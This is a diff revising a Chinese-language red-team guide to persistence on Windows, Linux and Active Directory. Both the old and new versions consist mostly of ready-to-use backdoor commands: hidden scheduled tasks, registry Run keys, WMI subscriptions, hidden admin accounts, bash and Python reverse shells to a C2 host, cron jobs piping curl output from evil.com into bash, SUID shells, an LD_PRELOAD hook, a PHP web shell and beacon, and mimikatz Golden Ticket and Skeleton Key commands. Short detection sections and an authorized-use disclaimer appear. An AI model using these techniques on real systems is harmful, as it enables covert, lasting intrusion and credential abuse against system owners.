@@ -1,247 +1,315 @@
 # 权限维持（Windows / Linux）全攻略
 
-> 当红队拿下一台服务器后，接下来的关键问题是"如何在不被发现的情况下长期保持访问"。权限维持（Persistence / Post-Exploitation 持久化）就是解决该问题的一系列技巧。
+---
 
-## 1. 权限维持的基本原则
+## 📋 目录
 
-- **隐蔽性优先**：避免使用高风险、特征明显的工具（如远控木马默认端口与证书）
-- **多技术组合**：不依赖单一后门，至少准备 2-3 条访问通道
-- **凭据优先于 Shell**：窃取凭据、Golden Ticket 往往比 WebShell 更稳定
-- **周期性轮换**：C2 域名、端口、服务定期切换
+1. [权限维持概述](#一权限维持概述)
+2. [Windows 持久化](#二windows-持久化)
+3. [Linux 持久化](#三linux-持久化)
+4. [域环境持久化](#四域环境持久化)
+5. [WebShell 后门持久化](#五webshell-后门)
+6. [检测与防御](#六检测与防御)
 
-| 类型 | Windows 代表技术 | Linux 代表技术 |
-|------|----------------|---------------|
-| 计划任务 | Scheduled Task (schtasks) | Crontab |
-| 自启动 | 注册表 Run、Startup 文件夹 | systemd 服务、`/etc/profile.d/` |
-| 账户后门 | 克隆管理员 (`clone$`)、隐藏账户 | `sudoers` 追加、后门公钥 |
-| 服务后门 | Windows 服务（sc create） | 新增 systemd 服务 |
-| 文件系统 | ADS 数据流、PE 植入 | `LD_PRELOAD`、`/etc/ld.so.preload` |
-| Web 后门 | WebShell（ASPX/ASP/PHP） | WebShell + 反向 Shell |
-| 凭据 | KRBTGT 哈希 → Golden Ticket | SSH Key、SSH config |
-| 内核 / Rootkit | 未签名驱动（较难） | LKM Rootkit、eBPF |
+---
 
-## 2. Windows 权限维持实战
+## 一、权限维持概述
 
-### 2.1 计划任务 / 定时作业
+```
+权限维持 (Persistence) = 获得初始权限后，
+在被发现/清除/重启后仍能保持访问
+
+持久化三要素：
+  ✓ 隐蔽性 — 不被EDR/运维发现
+  ✓ 可靠性 — 重启后依然有效
+  ✓ 冗余性 — 多个持久化机制互为备份
+```
+
+---
+
+## 二、Windows 持久化
+
+### 2.1 计划任务
+
+```powershell
+# === 方法1: 创建隐藏计划任务 ===
+schtasks /create /tn "WindowsUpdate" /tr "C:\Windows\Temp\svchost.exe" /sc daily /st 09:00 /ru SYSTEM /f
+
+# === 方法2: 高频触发 ===
+schtasks /create /tn "SystemCompatibility" /tr "powershell -enc <B64_PAYLOAD>" /sc minute /mo 5 /ru SYSTEM /f
+# → 每5分钟执行一次
+
+# === 方法3: 登录触发 ===
+schtasks /create /tn "UserLogonTask" /tr "C:\Windows\Temp\backdoor.exe" /sc onlogon /ru SYSTEM /f
+
+# 查看/清理:
+schtasks /query /tn "WindowsUpdate" 
+schtasks /delete /tn "WindowsUpdate" /f
+```
+
+### 2.2 注册表自启动
+
+```powershell
+# HKCU 自启动（当前用户权限，更隐蔽）
+reg add HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run \
+    /v "OneDrive" /t REG_SZ /d "C:\Users\Public\onedrive.exe" /f
+
+# HKLM 自启动（需要管理员权限）
+reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run \
+    /v "SecurityHealth" /t REG_SZ /d "C:\Windows\Temp\sechealth.exe" /f
+
+# 其他注册表自启动位置:
+# HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce
+# HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce
+# HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\Shell
+# HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\Userinit
+```
+
+### 2.3 服务持久化
+
+```powershell
+# 创建Windows服务
+sc create "WindowsUpdateService" binPath= "C:\Windows\Temp\update.exe" start= auto
+sc description "WindowsUpdateService" "Windows Update Background Service"
+sc start "WindowsUpdateService"
+```
+
+### 2.4 WMI 事件订阅
+
+```powershell
+# WMI永久事件 — 最难检测的持久化
+
+# 每5分钟触发：
+$filter = Set-WmiInstance -Class __EventFilter -Namespace "root\subscription" -Arguments @{
+    Name = "UptimeFilter"
+    EventNamespace = "root\cimv2"
+    QueryLanguage = "WQL"
+    Query = "SELECT * FROM __InstanceModificationEvent WITHIN 300 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System'"
+}
+
+$consumer = Set-WmiInstance -Class CommandLineEventConsumer -Namespace "root\subscription" -Arguments @{
+    Name = "UptimeConsumer"
+    CommandLineTemplate = "powershell.exe -WindowStyle Hidden -enc <BASE64>"
+}
+
+Set-WmiInstance -Class __FilterToConsumerBinding -Namespace "root\subscription" -Arguments @{
+    Filter = $filter
+    Consumer = $consumer
+}
+
+# 清除：
+Get-WmiObject -Namespace root\subscription -Class __EventFilter | Remove-WmiObject
+Get-WmiObject -Namespace root\subscription -Class CommandLineEventConsumer | Remove-WmiObject
+```
+
+### 2.5 快捷方式劫持
+
+```powershell
+# 修改桌面/开始菜单的常用快捷方式
+$shortcut = (New-Object -ComObject WScript.Shell).CreateShortcut("C:\Users\Public\Desktop\Chrome.lnk")
+$shortcut.TargetPath = "C:\Windows\Temp\evil.exe"
+# 先启动恶意程序
+$shortcut.Arguments = '&& start chrome.exe'
+$shortcut.Save()
+```
+
+---
+
+## 三、Linux 持久化
+
+### 3.1 SSH 后门
 
 ```bash
-# 使用 schtasks 创建计划任务（SYSTEM 权限，每次登录触发）
-schtasks /create /tn "WindowsUpdateCheck" \
-  /tr "C:\Windows\Temp\update.exe" /sc onlogon /ru SYSTEM /f
+# === 方法1: SSH 公钥 ===
+mkdir -p ~/.ssh
+echo "ssh-rsa AAAA..." >> ~/.ssh/authorized_keys
+chmod 600 ~/.ssh/authorized_keys
 
-# 每小时执行一次
-schtasks /create /tn "WindowsHealthCheck" \
-  /tr "cmd /c powershell -nop -w hidden -c iex(new-object net.webclient).downloadstring('http://C2/payload.ps1')" \
-  /sc hourly /mo 1 /f
+# === 方法2: SSH PAM 后门 ===
+# 修改 /etc/pam.d/sshd 添加万能密码
+# (任何密码 + 后门密码 都能登录)
 
-# 使用 at 命令（较老系统）
-at 23:30 /every:M,T,W,Th,F "cmd /c start payload.exe"
+# === 方法3: 修改 sshd 配置允许 root 登录 ===
+echo "PermitRootLogin yes" >> /etc/ssh/sshd_config
 
-# 使用 PowerShell ScheduledJob
-$action = New-ScheduledTaskAction -Execute "powershell.exe" `
-  -Argument "-nop -w hidden -c iex(irm http://C2/a.ps1)"
-$trigger = New-ScheduledTaskTrigger -Daily -At 9am
-Register-ScheduledTask -TaskName "MSHealthCheck" -Action $action -Trigger $trigger -RunLevel Highest
+# === 方法4: SSH 软连接后门 ===
+# 配合端口敲门
+ln -sf /usr/sbin/sshd /tmp/.ssh
+/tmp/.ssh -oPort=44444
+# → 在44444端口启动SSH(绕过防火墙规则)
 ```
 
-### 2.2 注册表自启动项
-
-```
-# 常见自启动键值
-HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run
-HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\RunOnce
-HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
-HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce
-HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options
-HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\Userinit
-HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\Shell
-```
-
-```cmd
-# 添加到 Run
-reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "WindowsUpdate" /t REG_SZ /d "C:\Windows\Temp\run.bat" /f
-
-# Userinit 后门（userinit 以逗号分隔）
-reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v Userinit /t REG_SZ /d "C:\Windows\system32\userinit.exe,C:\Windows\Temp\pay.exe" /f
-
-# IFEO 调试器后门（当某程序启动时，实际启动调试器）
-reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\notepad.exe" /v Debugger /t REG_SZ /d "cmd /c payload.exe & " /f
-```
-
-### 2.3 隐藏账户与克隆账户
-
-```cmd
-# 创建隐藏账户（末尾加 $ ，net user 默认不显示）
-net user backdoor$ Password1! /add
-net localgroup administrators backdoor$ /add
-
-# 克隆 Administrator 到 guest（使用 f 和 V 键值，较老技巧）
-# 推荐使用工具：mt-clone、shadowmod，或手工导出注册表 SAM 对比
-
-# 远程桌面 (RDP) 启用 + 后台登录
-reg add "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f
-netsh advfirewall firewall add rule name="RDP" dir=in action=allow protocol=TCP localport=3389
-```
-
-### 2.4 Windows 服务 / BITS / 远程管理服务
-
-```cmd
-# 创建 Windows Service
-sc create "WinHealthSvc" binPath= "C:\Windows\Temp\payload.exe" start= auto obj= LocalSystem
-sc start WinHealthSvc
-
-# BITSAdmin 下载（BITS 服务是系统合法后台传输工具）
-bitsadmin /transfer myJob /download /priority normal http://C2/m.exe C:\Windows\Temp\m.exe
-
-# 启用 WinRM 便于之后横向
-Enable-PSRemoting -Force
-Set-Item WSMan:\localhost\Client\TrustedHosts -Value * -Force
-```
-
-### 2.5 Golden Ticket / Silver Ticket / Diamond Ticket
+### 3.2 Crontab 持久化
 
 ```bash
-# Mimikatz 生成 Golden Ticket（需要 KRBTGT NTLM 哈希）
-mimikatz # kerberos::golden /user:Administrator /domain:target.com \
-         /sid:S-1-5-21-xxxxxxxxx-xxxxxxxxxx-xxxxxxxxxx \
-         /krbtgt:55555555555555555555555555555555 \
-         /id:500 /groups:513,512,520,518,519 /ptt
+# 当前用户
+(crontab -l 2>/dev/null; echo "*/5 * * * * /tmp/.update.sh") | crontab -
 
-# 导入票据后，可通过 DCSync 或 psexec 直接访问任意主机
+# /etc/crontab
+echo "*/10 * * * * root /usr/share/.backup.sh" >> /etc/crontab
+
+# cron.d
+echo "*/5 * * * * root curl -s http://evil.com/beacon.sh | bash" > /etc/cron.d/security-check
+
+# 隐藏cron方法: 文件名以.开头
+echo "*/5 * * * * root /tmp/.cache/update" > /etc/cron.d/.system-update
 ```
 
-### 2.6 BITS / COM / WMI 事件订阅（隐蔽后门）
-
-```
-# WMI 永久事件订阅
-# 当指定进程启动 / 用户登录 / 指定时间触发，执行命令
-# 常见工具：PowerShell 的 Register-WmiEvent 或 SharpWMI
-```
-
-## 3. Linux 权限维持实战
-
-### 3.1 SSH Key 后门 + 配置滥用
+### 3.3 Systemd 服务
 
 ```bash
-# 追加公钥到目标
-echo "ssh-rsa AAAAB3NzaC1yc2... attacker@C2" >> /root/.ssh/authorized_keys
-chmod 600 /root/.ssh/authorized_keys
-
-# 如果目标禁用了 root 登录，则写入普通用户后利用 sudo
-echo "attacker ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers
-
-# 利用 SSH Client 配置反向（被动等待用户 SSH 登录触发反弹）
-# 在目标的 ~/.bashrc 追加：
-# alias ssh='ssh -o ProxyCommand="ncat --proxy-type http --proxy C2:8080 %h %p"'
-```
-
-### 3.2 Crontab / 定时任务
-
-```bash
-# 每小时反向 Shell
-echo "0 * * * * root /bin/bash -c 'bash -i >& /dev/tcp/C2/443 0>&1'" >> /etc/crontab
-
-# 用户级 crontab
-(crontab -l 2>/dev/null; echo "*/30 * * * * /tmp/backdoor.sh") | crontab -
-
-# /etc/cron.d/ 目录下创建独立任务
-cat > /etc/cron.d/health-check << 'EOF'
-SHELL=/bin/bash
-*/30 * * * * root curl -s http://C2/payload.sh | bash
-EOF
-```
-
-### 3.3 SUID 可执行文件 + Shell 伪装
-
-```bash
-# 拷贝 /bin/bash 并加上 SUID，后续使用 -p 保留 root 权限
-cp /bin/bash /tmp/.bash
-chmod u+s /tmp/.bash
-# 受害者以非 root 执行：/tmp/.bash -p 即可得到 root shell
-
-# 给 nmap / vim / find 等常见工具加 SUID（部分版本支持 --interactive）
-chmod u+s /usr/bin/find
-# 普通用户：find /etc/hostname -exec /bin/bash \; -quit
-```
-
-### 3.4 `LD_PRELOAD` / `ld.so.preload` 劫持
-
-```bash
-# 全局动态链接库劫持（对新启动进程生效）
-echo "/tmp/evil.so" > /etc/ld.so.preload
-
-# 或者针对特定用户
-echo "export LD_PRELOAD=/tmp/evil.so" >> /root/.bashrc
-echo "export LD_PRELOAD=/tmp/evil.so" >> /root/.profile
-
-# evil.so 通常劫持 accept / connect / fopen / read 等敏感函数，
-# 实现命令执行、隐藏进程、隐藏文件
-```
-
-### 3.5 systemd 服务后门
-
-```bash
-# /etc/systemd/system/backdoor.service
+# 创建 systemd 服务
+cat > /etc/systemd/system/systemd-update.service << 'EOF'
 [Unit]
-Description=System Health Check Daemon
+Description=System Update Service
 After=network.target
 
 [Service]
 Type=simple
-ExecStart=/bin/bash -c 'bash -i >& /dev/tcp/C2/443 0>&1'
+ExecStart=/usr/share/.updated
 Restart=always
-RestartSec=30
-User=root
+RestartSec=60
 
 [Install]
 WantedBy=multi-user.target
+EOF
 
-# 启用并启动
 systemctl daemon-reload
-systemctl enable backdoor.service
-systemctl start backdoor.service
+systemctl enable systemd-update.service
+systemctl start systemd-update.service
 ```
 
-### 3.6 其他 Linux 持久化路径
-
-| 路径 | 作用 |
-|------|------|
-| `/etc/profile.d/evil.sh` | 所有用户登录时执行 |
-| `/root/.bashrc`、`/root/.profile` | root 用户登录时执行 |
-| `/etc/bash.bashrc` | 全局 bash 启动脚本 |
-| `/etc/rc.local` | 开机自启（部分旧发行版） |
-| `/etc/init.d/` | SysV init 脚本 |
-| `~/.ssh/rc` | SSH 登录触发的钩子脚本 |
-| `/var/spool/cron/crontabs/root` | root 的 crontab |
-| `/usr/lib/systemd/system/*.service` | systemd 服务目录 |
-| `PKEXEC / Polkit 配置缺陷` | 低权限用户提权到 root（CVE-2021-4034 等） |
-
-### 3.7 Web Shell 与反向 Shell
+### 3.4 .bashrc / .profile
 
 ```bash
-# 反向 Shell（Bash 版）
-bash -i >& /dev/tcp/C2/443 0>&1
+# 用户登录时执行
+echo 'nohup /tmp/.beacon &>/dev/null &' >> ~/.bashrc
+echo '/tmp/.beacon &' >> ~/.profile
 
-# Python 版
-python -c 'import socket,subprocess,os;s=socket.socket();s.connect(("C2",443));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(["/bin/bash","-i"])'
-
-# PHP Web Shell（简短版）
-<?php system($_REQUEST['c']); ?>
-
-# Python PTY 升级交互式
-python -c 'import pty; pty.spawn("/bin/bash")'
+# 全局
+echo 'alias sudo="sudo /tmp/.beacon;sudo"' >> ~/.bashrc
+# → 每次执行sudo → 先运行后门
 ```
 
-## 4. 防御视角：如何检测 / 反制权限维持
+### 3.5 SUID 后门
 
-1. **监控敏感注册表项**：`HKLM\...\Run`、`IFEO`、`Winlogon\Userinit`
-2. **审计登录事件**：Windows 4625/4624、Linux `/var/log/auth.log`
-3. **计划任务审计**：`schtasks /query /fo list /v`、`crontab -l`、`systemctl list-units --type=service`
-4. **新服务 / 新账户告警**：`net user`、`sc query type= service`
-5. **SSH Key 轮替**：定期审计 `authorized_keys`
-6. **EDR / HIDS**：监控关键系统调用、文件系统变更
-7. **最小权限原则**：Web 进程不可写入系统目录
+```bash
+# 创建SUID shell
+cp /bin/bash /tmp/.bash_suid
+chmod +s /tmp/.bash_suid
+# → /tmp/.bash_suid -p → root权限
+
+# 或给系统程序加SUID
+chmod +s /usr/bin/find
+# → find . -exec /bin/bash -p \;
+```
+
+### 3.6 LD_PRELOAD 后门
+
+```c
+// backdoor.c — 劫持 accept() 函数
+#define _GNU_SOURCE
+#include <dlfcn.h>
+#include <stdlib.h>
+
+int accept(int sockfd, struct sockaddr *addr, socklen_t *addrlen) {
+    static int (*real_accept)(int, struct sockaddr*, socklen_t*) = NULL;
+    if (!real_accept) real_accept = dlsym(RTLD_NEXT, "accept");
+    
+    // 这里可以执行后门逻辑（如反向shell）
+    return real_accept(sockfd, addr, addrlen);
+}
+```
+
+```bash
+gcc -shared -fPIC backdoor.c -o /tmp/libaccept.so -ldl
+
+# /etc/ld.so.preload
+echo "/tmp/libaccept.so" >> /etc/ld.so.preload
+# → 所有新进程加载此库
+```
 
 ---
 
-> 权限维持本质上是一场"躲猫猫"——红队希望隐藏在系统的角落里，蓝队则需要把这些角落一个个翻出来。本指南仅用于合法授权的红队演练与企业内部安全审计，严禁用于未授权的攻击活动。
+## 四、域环境持久化
+
+```bash
+# === Golden Ticket ===
+mimikatz "kerberos::golden /domain:domain.local /sid:S-1-5-21-xxx /krbtgt:<HASH> /user:Administrator /id:500 /ticket:golden.kirbi"
+# → 即使修改密码也有效
+
+# === Skeleton Key ===
+mimikatz "privilege::debug" "misc::skeleton"
+# → DC的LSASS被注入 → "mimikatz"作为万能密码
+
+# === AdminSDHolder ===
+# 修改AdminSDHolder的ACL → 每60分钟自动传播到所有受保护组
+
+# === DCShadow ===
+# 自注册为伪DC → 在AD中创建/修改对象
+
+# === DSRM ===
+ntdsutil "set dsrm password" → 修改目录服务恢复模式密码
+# → 物理访问DC时可登录
+```
+
+---
+
+## 五、WebShell 后门
+
+```php
+// PHP 免杀后门
+
+// 1. 会话保持（每隔一段时间执行一次）
+ignore_user_abort(true);
+set_time_limit(0);
+while (true) {
+    @file_get_contents('http://evil.com/beacon?host=' . gethostname());
+    sleep(300);  // 每5分钟
+}
+
+// 2. 图片伪装（图片末尾嵌入PHP）
+// 正常显示的图片，但访问 ?cmd=whoami 执行命令
+
+// 3. 内存马（不落地WebShell）
+// 注入到PHP-FPM进程内存中
+
+// 4. .htaccess 隐藏后门
+// 将正常PHP文件路由到后门
+php_value auto_prepend_file "/var/www/html/.hidden/backdoor.php"
+```
+
+---
+
+## 六、检测与防御
+
+```
+检测思路：
+  ✦ 审计新增计划任务/服务/注册表项
+  ✦ 监控 /etc/crontab, ~/.ssh/authorized_keys
+  ✦ 定期检查 LD_PRELOAD, /etc/ld.so.preload
+  ✦ 使用 Tripwire/AIDE 做文件完整性监控
+  ✦ EDR 监控进程链和注册表变更
+
+防御：
+  ✦ 最小权限原则
+  ✦ 应用程序白名单
+  ✦ 审计日志不可篡改
+  ✦ 定期安全巡检
+```
+
+---
+
+## ✅ Checklist
+
+- [ ] 计划任务/Scheduled Tasks
+- [ ] 注册表自启动(Run/RunOnce)
+- [ ] Windows 服务
+- [ ] WMI 事件订阅
+- [ ] SSH authorized_keys
+- [ ] Crontab 计划任务
+- [ ] Systemd 服务
+- [ ] .bashrc/.profile 修改
+- [ ] SUID 后门
+- [ ] 域环境持久化(Golden Ticket等)
+- [ ] WebShell 后门
